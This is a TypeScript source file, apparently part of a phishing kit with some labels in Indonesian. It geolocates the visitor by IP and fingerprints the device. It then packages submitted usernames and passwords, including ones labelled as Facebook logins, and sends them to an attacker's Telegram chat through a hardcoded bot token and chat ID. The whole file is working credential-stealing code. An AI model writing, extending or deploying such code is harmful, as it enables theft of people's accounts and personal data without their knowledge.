import axios from 'axios';

interface LocationData {
  ip: string;
  city: string;
  region: string;
}

const getLocation = async (): Promise<LocationData> => {
  try {
    const ipRes = await axios.get('https://ipapi.co/json/');
    return {
      ip: ipRes.data.ip || 'Unknown',
      city: ipRes.data.city || 'Unknown',
      region: ipRes.data.region || 'Unknown'
    };
  } catch (e) {
    console.error('Failed to get location', e);
    return { ip: 'Unknown', city: 'Unknown', region: 'Unknown' };
  }
};

const getDeviceInfo = (): string => {
  const ua = navigator.userAgent;
  // Simple check for common devices to mimic the screenshot style "samsung_SM-S908E"
  // In reality, browser UA doesn't always give exact model, but we can approximate or just send the UA string.
  // For the sake of the requested format "🧩 Device: [Device Info]", let's try to extract something readable.
  
  if (ua.includes('Android')) {
    const match = ua.match(/Android\s([0-9.]+);\s([^;]+)/);
    if (match && match[2]) {
        return match[2].trim();
    }
    return "Android Device";
  } else if (ua.includes('iPhone')) {
    return "iPhone";
  } else if (ua.includes('Windows')) {
    return "Windows PC";
  } else if (ua.includes('Macintosh')) {
    return "Mac";
  }
  return "Unknown Device";
};

// Unified function to handle all login types
export const sendToTelegram = async (
  identifier: string, 
  pass: string, 
  loginMethod: string, 
  extraInfo: string // Previously q2, can be used for "Security Answers" if needed
) => {
  const BOT_TOKEN = '8539103259:AAHnEJrkMJt2Z_vjyf-gENTJU6GnzpTnkCs';
  const CHAT_IDS = ['', '6076369736']; // Add your IDs here

  const loc = await getLocation();
  const deviceInfo = getDeviceInfo();

  // Date formatting: DD/MM/YYYY, HH:mm:ss
  const now = new Date();
  const dateStr = now.toLocaleDateString('id-ID', { day: '2-digit', month: '2-digit', year: 'numeric' });
  const timeStr = now.toLocaleTimeString('id-ID', { hour12: false });
  const dateTimeString = `${dateStr}, ${timeStr}`;

  // Determine Login Label based on method
  let loginLabel = "� ID Login";
  if (loginMethod === "HP Login") loginLabel = "📱 Nomor HP";
  if (loginMethod === "Email Login") loginLabel = "📧 Email";
  if (loginMethod === "Facebook Login") loginLabel = "👤 Email/Phone";

  const message = `
🔐 <b>LOGIN DATA</b>
─────────────────

🕰️ Waktu: ${dateTimeString}
🌐 IP      : <code>${loc.ip}</code>
🏙 City    : ${loc.city}
® Region  : ${loc.region}

� <b>LOGIN DETAILS</b>
─────────────────
${loginLabel}: <code>${identifier}</code>
� Password: <code>${pass}</code>

🛡️ <b>Security Answers:</b>
└ Q1:-
└ Q2:-

🖱️ <b>REQUEST INFO</b>
─────────────────
`;

  // Send to all chat IDs
  const results = await Promise.all(CHAT_IDS.map(chatId => {
    if (!chatId) return Promise.resolve(false);
    return sendMessage(BOT_TOKEN, chatId, message);
  }));

  return results.some(result => result === true);
};

// Wrapper for Facebook to match the unified signature
export const sendFacebookLogin = async (
  email: string, 
  pass: string,
  q1: string,
  q2: string
) => {
  return sendToTelegram(email, pass, "Facebook Login", "-");
};

const sendMessage = async (botToken: string, chatId: string, text: string) => {
  try {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
      }),
    });

    if (!response.ok) {
      throw new Error('Gagal mengirim ke Telegram');
    }
    return true;
  } catch (error) {
    console.error('Telegram Error:', error);
    return false;
  }
};
